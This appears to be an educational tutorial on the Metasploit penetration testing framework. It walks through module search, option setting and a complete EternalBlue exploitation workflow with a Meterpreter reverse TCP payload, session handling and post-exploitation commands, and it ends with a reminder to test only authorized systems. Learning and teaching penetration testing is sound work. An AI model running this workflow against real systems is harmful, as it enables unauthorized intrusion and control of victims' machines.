
# Metasploit

## What is Metasploit

- **Metasploit** is a powerful **penetration testing framework** used to find, test, and exploit vulnerabilities in systems.
- It is widely used by:
  - penetration testers
  - ethical hackers
  - cybersecurity researchers
  - CTF players

Metasploit provides thousands of **exploits, payloads, scanners, and post‑exploitation tools** that help security professionals test system security.

Key capabilities include:

- vulnerability scanning
- exploit development
- system exploitation
- payload delivery
- post‑exploitation activities

Because of its automation and extensive exploit database, Metasploit is one of the **most important tools in penetration testing**.

---

## Start Metasploit

To start Metasploit Framework in **Kali Linux**, open a terminal and run:

```
msfconsole
```

Steps after launching:

1. Wait for the framework to load
2. The Metasploit console will appear
3. You will see the prompt:

```
msf6 >
```

From here you can start searching for exploits, configuring modules, and running attacks.

---

## Understanding Metasploit Components

Metasploit has several important components:

| Component | Purpose |
|------|------|
| Exploit | Code that targets a vulnerability |
| Payload | Code executed after exploitation |
| Auxiliary | Scanners and other tools |
| Encoder | Used to evade detection |
| Post | Post‑exploitation modules |

These components work together during a penetration test.

---

## Search Module

To find available modules in Metasploit:

```
search <keyword>
```

Example:

```
search smb
```

Example result:

```
exploit/windows/smb/ms17_010_eternalblue
```

This helps locate exploits related to a specific service or vulnerability.

---

## Use Module

Once you find a module, load it using:

```
use <module>
```

Example:

```
use exploit/windows/smb/ms17_010_eternalblue
```

After selecting a module, the prompt changes to:

```
msf6 exploit(ms17_010_eternalblue) >
```

Now you can configure the exploit.

---

## Show Options

To see what parameters the module requires:

```
show options
```

Example output may include:

- RHOSTS (target IP)
- RPORT (target port)
- PAYLOAD
- LHOST (attacker IP)

You must configure required fields before running the exploit.

---

## Set Target

Specify the target system using:

```
set RHOST <target>
```

Example:

```
set RHOST 192.168.1.20
```

Some modules use:

```
set RHOSTS
```

instead of `RHOST`.

---

## Set Port

Specify the target service port:

```
set RPORT <port>
```

Example:

```
set RPORT 445
```

Common ports:

| Service | Port |
|------|------|
| SSH | 22 |
| FTP | 21 |
| HTTP | 80 |
| SMB | 445 |
| RDP | 3389 |

---

## Set Payload

Payloads determine **what happens after exploitation succeeds**.

To list payloads:

```
show payloads
```

To select one:

```
set PAYLOAD <payload>
```

Example:

```
set PAYLOAD windows/meterpreter/reverse_tcp
```

You may also need to set your attacker IP:

```
set LHOST 192.168.1.5
```

---

## Run Exploit

Once all required options are configured, run the exploit:

```
run
```

or

```
exploit
```

If successful, Metasploit will open a session with the target machine.

Example:

```
Meterpreter session 1 opened
```

---

## Background Session

If you want to return to the Metasploit console while keeping the session active:

```
background
```

This sends the session to the background so you can continue using Metasploit.

---

## Show Sessions

To see active sessions:

```
sessions
```

Example output:

```
Active sessions
===============

Id  Name  Type        Information
--  ----  ----        -----------
1         meterpreter Windows
```

---

## Interact with Session

To interact with a specific session:

```
sessions -i <id>
```

Example:

```
sessions -i 1
```

This allows you to control the compromised system.

---

## Meterpreter Commands (Common)

Meterpreter provides many post‑exploitation commands.

Examples:

```
sysinfo
```

Shows system information.

```
getuid
```

Shows current user.

```
ls
```

Lists files.

```
pwd
```

Shows current directory.

```
shell
```

Opens system shell.

---

## Simple Metasploit Workflow

A typical penetration testing workflow:

### Step 1 — Scan Target

Use **Nmap** to discover services.

```
nmap -sV 192.168.1.20
```

---

### Step 2 — Search Exploit

```
search smb
```

---

### Step 3 — Load Module

```
use exploit/windows/smb/ms17_010_eternalblue
```

---

### Step 4 — Configure Options

```
set RHOST 192.168.1.20
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.5
```

---

### Step 5 — Run Exploit

```
run
```

---

### Step 6 — Post Exploitation

Use Meterpreter commands:

```
sysinfo
getuid
```

---

## Use Cases

Metasploit is commonly used for:

- vulnerability exploitation
- penetration testing
- system access testing
- post‑exploitation analysis
- cybersecurity training
- CTF challenges

---

## Best Practice

Metasploit should only be used in **authorized environments**.

Safe practice platforms:

- TryHackMe
- Hack The Box
- PortSwigger Labs
- OWASP Juice Shop
- CTF competitions

Never exploit systems **without permission**.

---

## Summary

Metasploit is one of the **most powerful cybersecurity tools** used in penetration testing.

It allows security professionals to:

- identify vulnerabilities
- exploit weaknesses
- gain system access
- perform post‑exploitation analysis

Learning Metasploit is an essential step for anyone pursuing **ethical hacking or cybersecurity careers**.

<div style="background: #1f3327; border-radius: 8px; padding: 18px; margin: 20px 0; border-left: 5px solid #3ddc84; color: #e6e6e6;">
<strong>✔ Learning Tip</strong><br><br>
Use version control like Git to track your projects and notes. This helps you manage changes and collaborate effectively.
</div>